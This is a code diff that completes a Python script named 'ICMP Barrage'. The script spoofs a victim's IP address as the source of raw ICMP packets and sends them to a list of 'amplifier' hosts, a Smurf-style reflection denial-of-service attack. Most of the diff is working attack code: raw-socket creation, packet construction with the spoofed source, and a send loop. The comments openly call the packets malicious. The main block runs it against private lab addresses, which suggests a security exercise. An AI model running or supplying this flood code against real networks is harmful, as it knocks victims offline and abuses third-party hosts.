@@ -25,35 +25,41 @@ def construct_ICMP_payload(payload):
 	# serialize ICMP packet with computed checksum
 	return ping_type + ping_code + checksum + headers + payload
 
-def construct_IP_packet():
+def construct_IP_packet(src, dest):
 	''' Construct an IPv4 packet '''
 	# FIXME fill in IP packet address fields dynamically and compute checksum
-	version = b'\x04'
-	ihl = b''
-	service = b''
-	length = b''
-	ident = b''
-	flags = b''
-	ttl = b''
-	protocol = b'\x01'
-	header_chksm = b''
-	source_ip = b''
-	dest_ip = b''
+	v_ihl = 0x45 # set version number to 4 (IPv4) # set ihl value to 5 (no options field included)
+	tos = 0x00
+	length = 0x00 # let length be filled in by kernel
+	ident = 54321 # set packet identity number
+	flags = 0x00
+	ttl = 0xff # ttl set to max lifetime of 255
+	protocol = 0x01 # set to IP protocol 1 (ICMP)
+	header_chksm = 0x00 # compute header checksum
+	source_ip = socket.inet_aton(src)
+	dest_ip = socket.inet_aton(dest)
+	return struct.pack('!BBHHHBBH4s4s', v_ihl, tos, length, ident, flags, ttl, protocol, header_chksm, source_ip, dest_ip)
 
-def construct_packet(target, relays):
-	icmp_payload = construct_ICMP_payload(b"")
-	for dest in relays:
-		# FIXME: craft an IP packet with the victim's source IP and relay's dest IP
-		ip_packet = construct_IP_packet()
-		print(ip_packet)
-	#socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-	#return struct.pack('!BBHHHBBH4s4s', ip_data)
+def print_header(target):
+	''' Print headers to the ICMP Barrage program '''
+	print(f'##################\n## ICMP BARRAGE ##\n##################\nOrchestrating barrage on {target}')
 
-def icmp_barrage(target, relays):
+def icmp_barrage(target, amplifiers):
 	''' Send ping packets to the relays with source IP spoofed '''
-	pass
+	# create IP socket
+	sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+	# craft ICMP datagram
+	icmp_payload = construct_ICMP_payload(b"\x00")
+	# print ICMP barrage headers
+	print_header(target)
+	# iterate through amplifiers
+	for dest in amplifiers:
+		# craft an IP packet with the victim's source IP and amplifier's destination IP
+		ip_packet = construct_IP_packet(target, dest)
+		# append ICMP payload to IP header
+		packet = ip_packet + icmp_payload
+		# send malicious packet to the amplifier
+		sock.sendto(packet, (dest, 0))
 
 if __name__ == "__main__":
-	data = unhexlify("4500003c1c46400040060000ac100a63ac100a0c")
-	packet = construct_ICMP_payload(data)
-	print(packet.hex())
+	icmp_barrage('192.168.1.58', ['192.168.1.62'])
